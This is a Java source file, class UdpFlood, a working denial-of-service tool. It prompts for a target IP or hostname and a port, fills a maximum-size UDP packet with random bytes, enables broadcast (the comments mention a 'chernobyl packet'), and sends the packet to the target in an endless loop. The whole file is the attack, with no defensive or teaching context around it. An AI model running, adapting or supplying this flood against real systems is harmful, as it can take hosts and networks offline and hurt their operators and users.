import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.util.Scanner;

public class UdpFlood
{
	public UdpFlood() throws UnknownHostException, SocketException
	{
		DatagramSocket socket = null;
		InetAddress address = null;		
	
		System.out.flush(); 		
		System.out.println("Enter an IP or DNS: ");
		Scanner sc = new Scanner(System.in);		
		String ip = sc.next();
		
		System.out.flush(); 
		System.out.println("Enter a port: ");
		int port = sc.nextInt();
		
		StartFlood(ip, port, socket, address);
	}	
	
	public void StartFlood(String ip, int port, DatagramSocket socket, InetAddress address) throws UnknownHostException, SocketException 
	{
		SecureRandom random = new SecureRandom();
		byte[] buffer = new byte[65507];

		try
		{
			socket = new DatagramSocket();
			address = InetAddress.getByName(ip);
		} 
		catch (SocketException e) 
		{
			e.printStackTrace();
		}

		random.nextBytes(buffer); //Generate random data
		
		//Check if broadcasting is enabled to create a potential chernobyl packet
		boolean broadcastEnabled = socket.getBroadcast();
		if(broadcastEnabled == true) 
		{
			System.out.println("Broadcasting is enabled on network.");
		}
		else 
		{
			System.out.println("Broadcasting is disabled on network.");
			socket.setBroadcast(true);
		}
		
		//Create packet with destination and data
		DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, port);
		try 
		{
			//Commence Flood
			System.out.printf("Started flooding %s:%d\n", ip, port);
			while(true) 
			{
				socket.send(packet);
			}
		} 
		catch (IOException e) 
		{
			e.printStackTrace();
		}

		socket.close();
	}
}